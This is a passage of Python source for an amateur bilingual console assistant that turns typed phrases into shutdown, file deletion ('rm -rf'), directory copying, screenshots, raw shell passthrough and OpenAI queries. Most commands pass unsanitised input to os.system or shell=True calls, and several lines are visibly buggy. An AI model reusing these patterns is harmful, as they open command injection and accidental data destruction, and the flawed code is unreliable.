                    #shutdown
                    if 'shutdown' in saludo:
                        if 'now' in saludo:
                            if platform.system() == 'Windows':
                                subprocess.run('shutdown /s /f', shell=True)
                            elif platform.system() == 'Linux':
                                subprocess.run('shutdown now', shell=True)
                        elif 'shutdown -t' in saludo:
                            if platform.system() == 'Windows':
                                seconds=saludo[11:]
                                subprocess.run('shutdown /s /f /t' + seconds, shell=True)
                            elif platform.system() == 'Linux':
                                seconds=saludo[11:]
                                subprocess.run('sleep' + seconds + ' && shutdown -h now', shell=True)
                        elif '-r' in saludo and '-t' in saludo:
                            if platform.system() == 'Windows':
                                seconds=saludo[14:]
                                subprocess.run('shutdown /r /f /t' + seconds, shell=True)
                            elif platform.system() == 'Linux':
                                seconds=saludo[14:]
                                subprocess.run('sleep' + seconds + ' && shutdown -r now', shell=True)
                        elif saludo == 'shutdown -r':
                            if platform.system() == 'Windows':
                                subprocess.run('shutdown /r /f', shell=True)
                            elif platform.system() == 'Linux':
                                subprocess.run('shutdown -r now', shell=True)

                            

                    #copy all in actual directory
                    if 'cp all' in saludo or 'copy all' in saludo:
                        if  platform.system() == 'Linux':
                            print("\n")
                            shutil.copytree(os.getcwd(), 'gold')
                            print('The gold is in the bag!')
                        elif platform.system() == 'Windows':
                            shutil.copytree(os.getcwd(), 'gold')
                            print("\n")
                            print('The gold is in the bag!')
                        
                   #screenshot
                    if os.path.exists('/data/data/com.termux/'):
                        pass
                    else:
                        if saludo == 'screenshot' or saludo == 'captura':
                            if os.path.exists('screenshot.png'):
                                i = 1
                                while i <= 10:
                                    filename = f'screenshot{i}.png'
                                    if not os.path.exists(filename):
                                        os.rename('screenshot.png', filename)
                                        print(f'Image name changed to {filename}')
                                        imagen = pyautogui.screenshot()
                                        imagen.save('screenshot.png')
                                        print('\nScreenshot saved')
                                        break
                                    i += 1
                                else:
                                  print('Cannot capture more than 10 screenshots')
                                                                             
                                                                        
                            else:
                                imagen = pyautogui.screenshot()
                                imagen.save('screenshot.png')
                    
                    #screenshot naming
                        elif '.png' in saludo:
                            imagen = pyautogui.screenshot()
                            imagen.save(str(saludo[11:])) 
                    
                    #mkdir
                    if 'mkdir' in saludo:
                        os.mkdir(str(saludo[6:]))

                    #Colour
                    if saludo == 'colours':
                        cleanColour()

                    #Mode console
                    if saludo == 'console':
                        print(Fore.LIGHTBLUE_EX + 'Mode console ' + Fore.LIGHTGREEN_EX + 'ON' + Fore.LIGHTBLUE_EX + "\nComando" + Fore.LIGHTGREEN_EX + ' off ' + Fore.LIGHTBLUE_EX + 'para volver a C0d3x.')
                        while True:
                            command=input(pathcurrent + random_key_colour3 + '\n> ' + color_escojido)
                            if command == 'off':
                                print(Fore.LIGHTBLUE_EX + 'Mode console ' + Fore.LIGHTRED_EX + 'OFF')
                                break
                            elif command == '':
                                limpieza()
                                continue
                            #cd
                            elif 'cd ' in command:
                                try:
                                    os.chdir(command[3:])
                                except OSError:
                                    continue
                            else:
                                if platform.system() == 'Windows':
                                    subprocess.run('powershell.exe ' + str(command), shell=True)
                                    continue
                                else:
                                    subprocess.run(str(command), shell=True)
                                    continue
                
                    #host4live
                    if saludo == 'host4live':
                        host4alive()
                        
                    #open
                    ejecute = '.\ '
                    ejecute2 = ejecute.replace(' ', '')
                    if 'open' in saludo:
                        os.system(str(ejecute2) + saludo[5:])
                    elif str(ejecute2) in saludo or './' in saludo:
                        os.system(str(ejecute2) + saludo[2:])

                    #pwd
                    pwd = {'pwd'} 
                    for i in pwd:
                        if saludo == i:
                            if platform.system() == 'Linux':
                                print("\n")
                                subprocess.run("pwd", shell=True)
        
                    for i in pwd:
                        if saludo == i:
                            if platform.system() == 'Windows':
                                subprocess.run("echo %cd% ", shell=True)
                                print("\n")

                    #move
                    if 'mv ' in saludo:
                        if platform.system() == 'Windows':
                            subprocess.run('move ' + saludo.replace('mv ', ''), shell=True)
                        elif platform.system() == 'Linux':
                            subprocess.run('mv ' + saludo.replace('mv ', ''), shell=True)

                    #ls
                    ls_dir = {'ls', 'dir'} 
                    for i in ls_dir:
                        if saludo == i:
                            if  platform.system() == 'Linux':
                                subprocess.run("ls", shell=True)
                    for i in ls_dir:
                        if saludo == i:
                            if platform.system() == 'Windows':
                                subprocess.run("dir", shell=True)

      
        
                    #Update for unix
                    if saludo == "update":
                        if  platform.system() == 'Linux':
                            subprocess.run("apt update", shell=True)
                    if saludo == "upgrade":
                        if platform.system() == 'Linux':
                            subprocess.run("apt upgrade", shell=True)


                    #ping
                    if saludo[4:] == 'ping':
                    
                        if platform.system() == 'Linux':
                            saludo = saludo.replace('ping ','')
                            subprocess.call(['ping -c1', str(saludo)])
                            continue
                        elif platform.system() == 'Windows': 
                            saludo = saludo.replace('ping ','')
                            subprocess.call(['ping', saludo])
                            continue
                    
                     

                    #ifconfig, ipconfig
                    info_local = {'ifconfig' , 'ipconfig'}
                    for i in info_local:
                        if saludo == i:
                            if platform.system() == 'Linux':
                                subprocess.run(['ifconfig'])

                    for i in info_local:
                        if saludo == i:
                            if platform.system() == 'Windows':
                                subprocess.run(["ipconfig"])




                    #ip
                    ip = {'ip', 'tell me the ip', 'what is my ip', 'what ip i have', 'ip?'}
                    for i in ip:
                        if saludo == i:
                            try:
                                limpieza()
                                import socket
                                hostname = socket.gethostname()
                                local_ip = str(socket.gethostbyname(hostname))
                                import pyperclip
                                pyperclip.copy(local_ip)
                                print(color_escojido + "Your local ip is " + Fore.LIGHTGREEN_EX + local_ip + color_escojido + " and i coppied at the clipboard")
                              
                    	
                    		
                            except pyperclip.PyperclipException:
                                print(Fore.LIGHTYELLOW_EX + "Your local ip is  " + Fore.LIGHTGREEN_EX + local_ip + Fore.LIGHTYELLOW_EX + "  ｡◕ ‿ ◕ ｡\n")

                    #terminal
                    consolas = {'give me a console', 'console', 'shell'}
                    for i in consolas:
                        while saludo == i:
                            consola = input(Fore.LIGHTYELLOW_EX + "\nSelect a type of shell = " + Fore.LIGHTGREEN_EX + "Bash " + Fore.LIGHTMAGENTA_EX + "Cmd " + Fore.LIGHTBLUE_EX + "Powershell " + Fore.LIGHTYELLOW_EX + "Zsh " + Fore.LIGHTGREEN_EX + " -- > > " )
                            if consola == "powershell":
                                limpieza()
                                subprocess.run("powershell", shell=True)
                            if consola == "cmd":
                                limpieza()
                                subprocess.run("cmd", shell=True)
                            if consola == "bash":
                                limpieza()
                                subprocess.run("bash", shell=True)
                            if consola == "zsh":
                                limpieza()
                                subprocess.run("zsh", shell=True) 
                            break   
                    
                    voice_mode = ("voice", "voice mode")
                    for i in voice_mode:
                        if saludo == i:
                            print('Voice mode not available')
                            BucleEnglish()

                    #python script launcher
                    if 'run ' in saludo:
                        saludo = '/' + saludo[4:] 
                        try:
                            print('start wt.exe python C:/' + out3 + saludo)
                            subprocess.run("start wt.exe python C:/" + out3 + saludo, shell=True)
                        except:
                            print(Fore.LIGHTRED_EX + 'This file is not on the actual directory.\n')
        

                    #Clean
                    clean = {'clean', 'clean the screen', 'clean this', 'clean the console'}
        
                    for i in clean:
                        if saludo == i:
                            limpieza()

                    #delete dirs
                    if 'rm -rf' in saludo or 'rmdir' in saludo:
                        if platform.system() == 'Windows':
                            saludo = saludo.replace('rmdir ','')
                            saludo = saludo.replace('rm -rf ','')
                            os.system('rmdir /s ' + str(saludo))                           
                        elif platform.system() == 'Linux':
                            saludo = saludo.replace('rm -rf ','')
                            saludo = saludo.replace('del -d ','')
                            os.system('rm -rf ' + str(saludo))
                   

                    #delete files
                    if 'rm' in saludo or 'del' in saludo:
                        if platform.system() == 'Windows':
                            saludo = saludo.replace('del ','')
                            os.system('del ' + str(saludo))
                        elif platform.system() == 'Linux':
                            saludo = saludo.replace('rm ','')
                            os.system('rm ' + str(saludo))

                    #Break
                    ko = {'sleep', 'go to sleep', 'is time', 'chao', 'exit'}
                    others = {'chao', 'see you', 'bye', 'muak', 'suck it', 'fuck you', 'asshole', 'stupid'}
                    for i in ko:
                        if saludo == i:
                            limpieza()
                            print(Fore.LIGHTGREEN_EX + "\nFuck it ｡◕ _ ◕ ｡ zZz")
                            if platform.system() == 'Linux':
                                print("Fuck it")
                                exit()
                            elif platform.system() == 'Windows':
                                speak("Fuck it")
                                exit()
                            
                            
                            
                            
                    for i in others:
                        if saludo == i :
                            limpieza()
                            print(Fore.LIGHTYELLOW_EX + "Bye " + Fore.GREEN + " ｡ ◕ ‿ ◕ ｡" )
                            if platform.system() == 'Linux':
                                print("Bye")
                                exit()
                            elif platform.system() == 'Windows':
                                speak("Bye")
                                exit()
                              
     
                    #Busqueda en internet
                    def browser(thing_to_search):
                        webbrowser.open("https://www.google.com/search?client=opera-gx&q=" + thing_to_search + "&sourceid=opera&ie=UTF-8&oe=UTF-8")
                  
  
                    explorador = {'browser', 'search', '@', 'internet'}
                    for i in explorador:
                        if saludo == i:
                            limpieza()
                            if platform.system() == 'Linux':
                                print("What do you want i search?")
                                busca = browser(input(Fore.BLUE + "@Browser@-->" + color_escojido))
                                limpieza()
                                continue
                                
                            elif platform.system() == 'Windows':
                                speak("What do you want i search?")
                                busca = browser(input(Fore.BLUE + "@Browser@-->" + color_escojido))
                                limpieza()
                                continue
                    #openai integration
                    if 'codex' in saludo:
                        import openai
                        try:
                            saludo = saludo.replace('codex','')
                            #openai api
                            client = OpenAI(api_key='')
                            completion = client.chat.completions.create(model="gpt-3.5-turbo", messages=[{"role": "user", "content": str(saludo)}])
                            response = completion.choices[0].message.content  
                            print(response)
                        except openai.AuthenticationError:
                            print(random_key_colour + 'Something happens with the API(openai), check it.\n')
                            continue
                        except openai.RateLimitError:
                            print(random_key_colour + 'Something went wrong with the response time, check the API(openai) or try again.\n')
                            continue
                        except openai.InternalServerError:
                            print(Fore.LIGHTRED_EX + 'The server is overloaded, try later(openai).')
                        
                    
        
#Spanish Voice
def hablar(text):
      engine = pyttsx3.init()
      voices = engine.getProperty('voices')
      engine.setProperty('voice', voices[0].id)
      engine.setProperty('rate', 160)
      engine.say(text)
      engine.runAndWait()



#Voice Funtion Spanish


#English Voice
def speak(text):
      engine = pyttsx3.init()
      voices = engine.getProperty('voices')
      engine.setProperty('voice', voices[1].id)
      engine.setProperty('rate', 190)
      engine.say(text)
      engine.runAndWait()


#Voice Funtion English


#######################################################################################TEXT MODE##################################################################################################################################################################################################

while True:
            print(Style.NORMAL + Fore.LIGHTYELLOW_EX + "[+] Choose a language[ENGLISH] " + Fore.LIGHTBLUE_EX + "-" + Fore.LIGHTGREEN_EX + " [+] Escoje un idioma[SPANISH].\n")
            time.sleep(0.3)
            print(Fore.LIGHTBLUE_EX + "1" + Fore.LIGHTGREEN_EX + "." + Fore.LIGHTMAGENTA_EX + "English" + Fore.LIGHTBLUE_EX + "\n" + "2" + Fore.LIGHTGREEN_EX +"." + Fore.LIGHTMAGENTA_EX + "Spanish\n ")
            respuesta_idioma = input(Fore.LIGHTGREEN_EX + '==>> ' + Fore.LIGHTMAGENTA_EX) 
            idiomas = {'1', '2', 'spanish', 'Spanish', 'español', 'Español', 'English', 'english', 'duerme', 'sleep', 'Duerme', 'Sleep'}
            for n in idiomas:
                if respuesta_idioma != n:
                    continue
            limpieza()
  
            #Sleep
            sleep = {'duerme', 'sleep'}
            if respuesta_idioma == sleep:
                limpieza()
                print(random_key_colour2 + "\nA mamarla " + random_colours3 + "｡ ◕__◕ ｡")
                exit()
 
            #Language not available

            #Other languages
            if respuesta_idioma == "ruso":
                print("This language is not available yet")
                continue
            if respuesta_idioma == "aleman":
                print("This language is not available yet")
                continue
            if  respuesta_idioma == "":
                    limpieza()
                    print(random_key_colour2 + "Default language = Español")
                    #Bucle c0d3x
                    limpieza()
                    if platform.system() == 'Windows':
                        f11x2()
                    BucleEspanol()
  
  
            #Modo español
            español = {'2', 'spanish', 'Spanish', 'español', 'Español'}
            for x in español:
                if respuesta_idioma == x:
                    limpieza()
                    if platform.system() == 'Linux':
                        print(Style.NORMAL + Fore.LIGHTYELLOW_EX + "\nHaz escojido el español\n")                       
                    elif platform.system() == 'Windows':
                        hablar('Haz escojido el español')
                    time.sleep(0.8)
                    limpieza()
                    if platform.system() == 'Windows':
                        f11x2()
                    BucleEspanol()
                elif respuesta_idioma != x:
                    print('Escoje un idioma disponible(Español e Inglés)')
                    continue


            #English mode
            saludos_en = ('1', 'english', 'English', 'ingles', 'Ingles', 'Inglés', 'inglés')
            for x in saludos_en:
                if respuesta_idioma == x:
                    limpieza()
                    if platform.system() == 'Linux':
                        print(Style.NORMAL + Fore.LIGHTYELLOW_EX + "\nYou selected english\n")                       
                    elif platform.system() == 'Windows':
                        speak('English selected')
                    time.sleep(0.8)
                    #C0d3x bucle
                    limpieza()
                    if platform.system() == 'Windows':
                        f11x2()
                    BucleEnglish()
                elif respuesta_idioma != x:
                    print('Choose an available language(English or Spanish)')
                    continue

            limpieza()